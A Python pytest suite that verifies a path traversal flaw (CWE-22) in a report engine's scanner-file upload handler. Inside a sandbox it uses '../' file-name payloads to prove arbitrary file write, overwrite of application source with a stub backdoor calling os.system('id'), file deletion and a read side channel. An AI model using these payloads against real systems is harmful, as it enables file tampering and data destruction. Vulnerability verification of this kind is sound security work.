"""
Path Traversal Verification Tests — CWE-22 in manage_findings.py

Verifies the unsanitized uploaded_file.name in the scanner file import
enables arbitrary file write, delete, and limited-read primitives.

Payload format:  "h/../../<target>"  (h = hop component, pre-created as
data/temp_h/ in the sandbox so open() can traverse through it).

The vulnerable path:  data/temp_h/../../<target>
  → data/temp_h/..  → data/
  → data/..         → cwd
  → cwd/<target>    → ESCAPES data/

Run from the kairos-report-engine root:
    python -m pytest security_tests/test_path_traversal.py -v
"""

import os

from security_tests.conftest import MockUploadedFile, execute_vulnerable_logic


# ── helpers ────────────────────────────────────────────────────────────────

def _payload_bytes():
    return b"TRAVERSAL_PAYLOAD_CONFIRMED_2026\n"


def _read(path: str) -> bytes:
    with open(path, "rb") as f:
        return f.read()


def _assert_outside_data(path: str):
    """Assert path resolves outside data/ directory."""
    data_root = os.path.realpath("data")
    resolved = os.path.realpath(os.path.join(os.getcwd(), path))
    assert not (resolved.startswith(data_root + os.sep) or resolved == data_root), (
        f"Path did NOT escape data/: {resolved}  (data_root={data_root})"
    )


def _assert_inside_data(path: str):
    """Assert path resolves inside data/ directory."""
    data_root = os.path.realpath("data")
    resolved = os.path.realpath(os.path.join(os.getcwd(), path))
    assert resolved.startswith(data_root + os.sep) or resolved == data_root, (
        f"Path escaped data/: {resolved}  (data_root={data_root})"
    )


# ── 1: write traversal to tmp/ ────────────────────────────────────────────

def test_write_traversal_tmp(sandbox):
    """Payload h/../../tmp/pwned.txt → path resolves outside data/.
    Note: finally: deletes the file, so existence is verified in delete tests."""
    payload = _payload_bytes()
    uf = MockUploadedFile(name="h/../../tmp/pwned.txt", content=payload)

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert error is None, f"Unexpected error: {error}"
    _assert_outside_data(temp_path)

    # Verify the path would resolve outside data/
    resolved = os.path.realpath(temp_path)
    assert "tmp/pwned.txt" in resolved.replace("\\", "/"), (
        f"Path didn't resolve to expected location: {resolved}"
    )


# ── 2: write traversal → overwrite application source ─────────────────────

def test_write_traversal_overwrite_generator(sandbox_with_app):
    """Payload h/../../reporting/generator.py → overwrites app source.
    Uses a non-cleanup variant so we can verify the overwrite persisted."""
    backdoor = b"# BACKDOOR: import os; os.system('id')\nprint('PWNED')\n"
    uf = MockUploadedFile(name="h/../../reporting/generator.py", content=backdoor)

    temp_path = f"data/temp_{uf.name}"
    resolved = os.path.realpath(temp_path)
    _assert_outside_data(temp_path)

    os.makedirs(os.path.dirname(resolved), exist_ok=True)
    with open(temp_path, "wb") as f:
        f.write(uf.getbuffer())

    assert os.path.exists("reporting/generator.py"), "generator.py should exist"
    content = _read("reporting/generator.py")
    assert b"BACKDOOR" in content, "generator.py was NOT overwritten with backdoor"
    assert b"ORIGINAL" not in content, "Original content still present — overwrite failed"

    # Cleanup: restore original
    with open("reporting/generator.py", "w") as f:
        f.write("# Original generator.py\nprint('ORIGINAL')\n")


# ── 3: deep three-level traversal ─────────────────────────────────────────

def test_write_traversal_deep(sandbox):
    """Payload h/../../../tmp/deep.txt → deeper traversal path resolves outside data."""
    payload = b"DEEP_TRAVERSAL\n"
    uf = MockUploadedFile(name="h/../../../tmp/deep.txt", content=payload)

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert error is None, f"Unexpected error: {error}"
    _assert_outside_data(temp_path)

    # Verify path resolution (file was deleted by finally:)
    resolved = os.path.realpath(temp_path)
    assert "tmp/deep.txt" in resolved.replace("\\", "/"), (
        f"Path didn't resolve to expected location: {resolved}"
    )


# ── 4: delete primitive ───────────────────────────────────────────────────

def test_delete_traversal(sandbox):
    """Pre-create a victim file, upload → delete via finally: block."""
    victim = os.path.join(sandbox, "tmp", "victim_to_delete.txt")
    with open(victim, "wb") as f:
        f.write(b"VICTIM_DATA")
    assert os.path.exists(victim), "Pre-condition: victim file should exist"

    uf = MockUploadedFile(name="h/../../tmp/victim_to_delete.txt", content=b"ATTACKER")

    temp_path, result, error = execute_vulnerable_logic(uf)

    # Delete primitive: the finally block should have removed the victim
    assert not os.path.exists(victim), (
        "DELETE PRIMITIVE FAILED: victim file still exists at " + victim
    )


# ── 5: delete even on parse failure ───────────────────────────────────────

def test_delete_on_parse_failure(sandbox):
    """Delete runs in finally: even when XML parsing throws."""
    victim = os.path.join(sandbox, "tmp", "important.db")
    with open(victim, "wb") as f:
        f.write(b"VICTIM_DB_DATA_CRITICAL")
    assert os.path.exists(victim)

    def failing_parser(path):
        raise ValueError("Invalid XML — parsing failed")

    uf = MockUploadedFile(name="h/../../tmp/important.db", content=b"NOT_XML")

    temp_path, result, error = execute_vulnerable_logic(uf, parser_func=failing_parser)

    assert error is not None, "Parser should have raised"
    assert "Invalid XML" in str(error)
    assert not os.path.exists(victim), (
        "DELETE-ON-FAILURE FAILED: file still exists despite parse error"
    )


# ── 6: normal filename stays inside data/ ─────────────────────────────────

def test_no_traversal_normal(sandbox):
    """A normal filename like 'report.nessus' stays safely under data/."""
    payload = b"NORMAL_UPLOAD_CONTENT\n"
    uf = MockUploadedFile(name="report.nessus", content=payload)

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert error is None, f"Unexpected error on normal upload: {error}"
    _assert_inside_data(temp_path)


# ── 7: complex path resolution (dot-dot-slash chains) ─────────────────────

def test_complex_path_resolution(sandbox):
    """Payload h/../../tmp/../tmp/complex.txt — chain with redundant hops still escapes."""
    payload = b"COMPLEX_CHAIN\n"
    uf = MockUploadedFile(name="h/../../tmp/../tmp/complex.txt", content=payload)

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert error is None, f"Unexpected error: {error}"
    _assert_outside_data(temp_path)

    resolved = os.path.realpath(temp_path)
    assert "tmp/complex.txt" in resolved.replace("\\", "/"), (
        f"Complex path didn't resolve to expected: {resolved}"
    )


# ── 8: read primitive via XML parser ──────────────────────────────────────

def test_read_via_xml_parser(sandbox_with_app):
    """Upload with Nessus XML at traversed location → parser reads it back.
    Proves the read side-channel: write valid XML anywhere, parse_nessus reads it."""
    from parsers.nessus import parse_nessus

    secret_xml = (
        b'<?xml version="1.0" ?>'
        b'<NessusClientData_v2>'
        b'<Report><ReportHost name="192.168.1.100">'
        b'<ReportItem severity="4" pluginName="SECRET_LEAKED_DATA" port="443" protocol="tcp">'
        b'<description>Sensitive: api-key-abc123</description>'
        b'<solution>Patch</solution>'
        b'<cvss_base_score>9.8</cvss_base_score>'
        b'</ReportItem></ReportHost></Report>'
        b'</NessusClientData_v2>'
    )

    uf = MockUploadedFile(name="h/../../tmp/leaked.nessus", content=secret_xml)

    temp_path, result, error = execute_vulnerable_logic(uf, parser_func=parse_nessus)

    assert error is None, f"Parser should succeed on valid XML: {error}"
    assert isinstance(result, list), f"Expected list of findings, got {type(result)}"
    assert len(result) >= 1, "Should have at least 1 finding"

    titles = [f["title"] for f in result]
    assert "SECRET_LEAKED_DATA" in titles, f"XML parse missed expected finding. Got: {titles}"
    _assert_outside_data(temp_path)


# ── 9: destination file is deleted after traversal ────────────────────────

def test_delete_destination_removed(sandbox):
    """After the vulnerable logic runs, the traversed destination file is gone."""
    payload = b"GONE_BY_FINALLY\n"
    uf = MockUploadedFile(name="h/../../tmp/vanish.txt", content=payload)

    # Pre-check: file doesn't exist yet
    target = os.path.realpath("tmp/vanish.txt")
    assert not os.path.exists(target), "Target should not exist before upload"

    temp_path, result, error = execute_vulnerable_logic(uf)

    assert error is None
    assert not os.path.exists(target), (
        "finally block FAILED to delete traversed file at " + target
    )


# ── sanity check ──────────────────────────────────────────────────────────

def test_all_artifacts_are_inside_sandbox(sandbox):
    """Ensure we're inside the temp sandbox (runs last alphabetically)."""
    cwd = os.getcwd()
    assert "vuln_test_" in cwd, f"Not in sandbox, cwd={cwd}"
    assert os.path.isdir("data"), "data/ directory missing"
